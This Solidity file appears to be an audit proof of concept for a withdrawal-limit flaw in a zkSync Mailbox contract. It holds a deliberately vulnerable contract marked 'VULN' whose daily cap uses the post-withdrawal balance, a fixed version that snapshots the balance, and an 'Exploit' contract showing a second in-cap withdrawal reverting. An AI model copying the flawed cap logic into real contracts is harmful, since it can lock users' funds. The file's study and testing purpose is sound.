// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  zkSync Mailbox._verifyWithdrawalLimit (OpenZeppelin, February 2023).
    The daily cap is withdrawalFactor percent of address(this).balance.
    A withdrawal in the same window lowers that balance, so the next
    withdrawal reverts even though it is inside the cap of the balance
    at the start of the window.
*/

contract Mailbox {
    uint256 public withdrawalFactor = 10;
    uint256 public withdrawnAmountInWindow;
    uint256 public lastWindow = type(uint256).max;
    uint256 public lastCap;
    uint256 public lastUsed;
    event CapChecked(uint256 cap, uint256 used);

    function seed() external payable {}

    function withdraw(uint256 amount) external {
        uint256 window = block.timestamp / 1 days;
        if (window != lastWindow) {
            lastWindow = window;
            withdrawnAmountInWindow = 0;
        }
        // Quoted Mailbox check: factor times address(this).balance, not the balance at window open.
        lastCap = (withdrawalFactor * address(this).balance) / 100; // @> VULN: cap uses the post-withdrawal balance
        lastUsed = amount + withdrawnAmountInWindow;
        emit CapChecked(lastCap, lastUsed);
        require(lastUsed <= lastCap, "w4");
        withdrawnAmountInWindow = lastUsed;
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "pay");
    }
}

contract MailboxFixed {
    uint256 public withdrawalFactor = 10;
    uint256 public withdrawnAmountInWindow;
    uint256 public lastWindow = type(uint256).max;
    uint256 public snapshotBalance;

    function seed() external payable {}

    function withdraw(uint256 amount) external {
        uint256 window = block.timestamp / 1 days;
        if (window != lastWindow) {
            lastWindow = window;
            withdrawnAmountInWindow = 0;
            snapshotBalance = address(this).balance;
        }
        uint256 cap = (withdrawalFactor * snapshotBalance) / 100;
        uint256 used = amount + withdrawnAmountInWindow;
        require(used <= cap, "w4");
        withdrawnAmountInWindow = used;
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "pay");
    }
}

contract StuckMarker {
    string public symbol = "LOCKED-ETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract Exploit {
    uint256 public constant SEED = 1000 ether;
    uint256 public constant FIRST = 60 ether;
    uint256 public constant SECOND = 40 ether;
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    Mailbox public mailbox;
    StuckMarker public stuck;

    constructor() {
        mailbox = new Mailbox();
        stuck = new StuckMarker();
    }

    function run() external payable {
        require(msg.value == SEED, "funds");
        mailbox.seed{value: SEED}();
        require(address(mailbox).balance == SEED, "seeded");
        mailbox.withdraw(FIRST);
        require(address(mailbox).balance == SEED - FIRST, "first paid");
        require(mailbox.withdrawnAmountInWindow() == FIRST, "window used");
        bool blocked = false;
        try mailbox.withdraw(SECOND) {
            blocked = false;
        } catch {
            blocked = true;
        }
        require(blocked, "second withdrawal paid");
        require(address(mailbox).balance == SEED - FIRST, "40 ETH still in the mailbox");
        require(mailbox.withdrawnAmountInWindow() == FIRST, "window not advanced");
        stuck.mint(SINK, SECOND);
        require(stuck.balanceOf(SINK) == SECOND, "locked 40");
    }

    receive() external payable {}
}
